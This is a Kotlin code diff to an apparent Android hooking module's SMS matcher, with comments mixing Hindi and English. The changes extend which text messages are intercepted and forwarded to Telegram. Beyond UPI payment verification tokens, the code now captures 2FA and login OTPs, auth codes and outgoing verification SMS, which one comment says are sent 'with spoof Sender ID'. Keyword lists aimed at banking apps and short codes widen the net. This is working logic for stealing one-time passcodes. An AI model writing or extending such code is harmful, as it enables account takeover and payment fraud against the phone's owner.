@@ -27,16 +27,27 @@ object SmsMatcher {
 
     fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
         if (!config.hookIncomingSms && !config.hookUpiVerification) return false
-        return shouldInterceptHookedUpi(config, sender, body)
+        return shouldInterceptIncoming(config, sender, body)
     }
 
     fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
         if (!config.hookOutgoingSms) return false
-        return shouldInterceptHookedUpi(config, recipient, body)
+        return shouldInterceptOutgoing(config, recipient, body)
     }
 
-    /** Sirf hooked UPI app ka verify/token SMS — Telegram format same rahega */
-    fun shouldInterceptHookedUpi(config: ModuleConfig, peer: String, body: String): Boolean {
+    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String, direction: String): Boolean {
+        if (!config.autoForwardToken) return false
+        return when (direction) {
+            "outgoing" -> shouldInterceptOutgoing(config, peer, body)
+            else -> shouldInterceptIncoming(config, peer, body)
+        }
+    }
+
+    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String): Boolean =
+        shouldForwardToTelegram(config, peer, body, "incoming")
+
+    /** Incoming: verify token, 2FA OTP, hooked UPI app SMS */
+    fun shouldInterceptIncoming(config: ModuleConfig, peer: String, body: String): Boolean {
         if (body.isBlank() || peer.isBlank()) return false
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
@@ -45,17 +56,25 @@ object SmsMatcher {
         if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
         if (UpiAppRegistry.matchAmongBySender(hooked, peer) != null) return true
         if (UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
-
-        // Encrypted UPI verify token — jab sirf 1 app hooked ho
         if (isEncryptedToken(body) && hooked.size == 1) return true
+        if (is2faContent(body) && hooked.isNotEmpty()) return true
 
         return false
     }
 
-    /** Telegram pe sirf hooked UPI app verification token / OTP */
-    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String): Boolean {
-        if (!config.autoForwardToken) return false
-        return shouldInterceptHookedUpi(config, peer, body)
+    /** Outgoing: jo SMS bhejo verify ke liye — Telegram pe spoof Sender ID ke saath */
+    fun shouldInterceptOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
+        if (!config.hookOutgoingSms) return false
+        if (body.isBlank() || recipient.isBlank()) return false
+        val hooked = enabledHookedApps(config)
+        if (hooked.isEmpty()) return false
+
+        if (isUpiVerificationContent(body) || isEncryptedToken(body)) return true
+        if (is2faContent(body)) return true
+        if (isShortCodeRecipient(recipient)) return true
+        if (UpiAppRegistry.matchAmong(hooked, recipient, body) != null) return true
+
+        return body.length >= 4 && hooked.isNotEmpty()
     }
 
     fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
@@ -77,7 +96,11 @@ object SmsMatcher {
         return digits.length >= 8 && !sender.any { it.isLetter() }
     }
 
-    /** Telegram / local — poora SMS body dikhao, sirf OTP digits mat kaato agar UPI verification hai */
+    fun isShortCodeRecipient(recipient: String): Boolean {
+        val digits = recipient.replace("\\D".toRegex(), "")
+        return digits.length in 4..10
+    }
+
     fun extractToken(body: String, autoExtract: Boolean): String {
         val trimmed = body.trim()
         if (trimmed.isEmpty()) return ""
@@ -102,14 +125,24 @@ object SmsMatcher {
         return tokenChars >= compact.length * 0.85
     }
 
+    private fun is2faContent(body: String): Boolean {
+        val upper = body.uppercase()
+        val keywords = listOf(
+            "2FA", "TWO FACTOR", "TWOFACTOR", "TWO-FACTOR", "SECOND OTP", "2ND OTP",
+            "LOGIN OTP", "AUTHENTICATION", "AUTH CODE", "SECURE CODE", "STEP 2"
+        )
+        return keywords.any { upper.contains(it) }
+    }
+
     private fun isUpiVerificationContent(body: String): Boolean {
         if (isEncryptedToken(body)) return true
+        if (is2faContent(body)) return true
         val trimmed = body.trim()
         if (trimmed.length <= 3) return false
         val upper = trimmed.uppercase()
         val keywords = listOf(
             "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
-            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "BANK", "PAY"
+            "PHONEPE", "PAYTM", "PYTM", "GPAY", "BHIM", "CODE", "PIN", "BANK", "PAY"
         )
         return keywords.any { upper.contains(it) }
     }
